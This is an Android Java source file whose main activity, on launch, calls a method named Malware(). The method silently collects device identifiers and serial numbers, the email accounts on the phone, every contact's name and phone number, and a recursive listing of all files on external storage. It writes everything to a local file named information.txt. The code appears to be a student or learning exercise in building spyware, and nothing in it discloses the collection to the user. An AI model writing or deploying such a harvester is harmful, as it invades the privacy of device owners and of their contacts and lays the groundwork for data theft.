package com.example.saeedelcyber;

import androidx.appcompat.app.AppCompatActivity;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.sax.EndElementListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Patterns;
import android.view.View;
import android.widget.Button;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.regex.Pattern;

import android.provider.Settings.Secure;


public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        Malware();

    }
    @SuppressLint("Range")
    void Malware()
    {   FileOutputStream fos= null;

         String email = null;
         String phone = null;
         String accountName = null;




        int sdkVersion = android.os.Build.VERSION.SDK_INT;
        String serviceName = Context.TELEPHONY_SERVICE;
        TelephonyManager m_telephonyManager = (TelephonyManager) getSystemService(serviceName);
        Date curDate = new Date();

         String text= "Sdk version: " + sdkVersion + "\n"+"Device: "
                +  android.os.Build.DEVICE +"\n" +"Model: "  + android.os.Build.MODEL + "\n"
                + "Product: "+android.os.Build.PRODUCT + "\n"+"OS version: "
                +android.os.Build.VERSION.RELEASE  + "\nAndroid ID: "
                + Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ANDROID_ID)+"\nUser: "+ Build.USER
                +"\nBrand:"+Build.BRAND+"\nDisplay: "+Build.DISPLAY+"\nHardware: "
                +Build.HARDWARE+"\nBootloader: "+Build.BOOTLOADER+"\nID: "+Build.ID+"\nHost:"+Build.HOST
                +"\nSerial:"+Build.SERIAL+"\nManufacturer:"+Build.MANUFACTURER+"\nFingerprint:"
                +Build.FINGERPRINT+ "\nbuild date given in MS since unix epoch: "
                + Build.TIME+ "\nBoard: " +Build.BOARD

                +"\nCPU ABI: " +Build.CPU_ABI
                +"\nOwner Info:\n";

        Pattern gmailPattern = Patterns.EMAIL_ADDRESS;
        Account[] accounts = AccountManager.get(this).getAccounts();

        for (Account account : accounts) {
            if (gmailPattern.matcher(account.name).matches()) {
                text+="    Name: "+account.name+" Type: "+account.type+"\n";
            }
        }
        text+="Contacts:\n";

        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        text+="    Name: "+name+"  " +"Phone number: "+ phoneNo+"\n";

                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
        text+="Files: \n";

        File sdCardRoot = Environment.getExternalStorageDirectory();
        ArrayList<String> filepath= new ArrayList<String>();
        walkdir(sdCardRoot,filepath);
        for (String s:filepath)
              {
                  text+=s+"\n";

        }

        try {
            fos = openFileOutput("information.txt", Context.MODE_PRIVATE);
        } catch (FileNotFoundException fileNotFoundException) {
            fileNotFoundException.printStackTrace();
        }

        try {
            fos.write(text.getBytes());
            fos.close();
        } catch (IOException ioException) {
            ioException.printStackTrace();
        }






                }



    private void walkdir(File dir,ArrayList<String> filepath) {
        File listFile[] = dir.listFiles();

        if (listFile != null) {
            for (int i = 0; i < listFile.length; i++) {

                if (listFile[i].isDirectory()) {// if its a directory need to get the files under that directory
                    walkdir(listFile[i],filepath);
                } else {// add path of  files to your arraylist for later use

                    //Do what ever u want
                    filepath.add( "   File:"+listFile[i].getAbsolutePath());

                }
            }
        }
    }
}


